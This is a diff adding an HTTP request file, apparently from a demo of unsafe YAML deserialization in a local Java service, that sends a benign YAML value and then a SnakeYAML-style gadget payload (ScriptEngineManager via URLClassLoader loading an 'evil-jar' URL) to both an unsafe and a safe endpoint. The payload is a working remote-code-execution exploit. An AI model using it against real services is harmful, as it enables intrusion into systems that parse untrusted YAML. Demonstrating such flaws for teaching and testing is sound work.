@@ -1,0 +1,34 @@
+### Remote Code execution - VALID input
+
+POST http://localhost:8082/process-yaml-unsafe
+Accept: application/json
+Content-Type: application/json
+
+{
+  "yaml": "name: Hello world!"
+}
+
+### Remote Code execution UNSAFE ---
+
+POST http://localhost:8082/process-yaml-unsafe
+Accept: application/json
+Content-Type: application/json
+
+{
+  "yaml": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8082/evil-jar\"]]]]"
+}
+
+### Remote Code execution SAFE +++
+
+POST http://localhost:8082/process-yaml-safe
+Accept: application/json
+Content-Type: application/json
+
+{
+  "yaml": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8082/evil-jar\"]]]]"
+}
+
+### Try evil.jar download
+
+GET http://localhost:8082/evil-jar
+
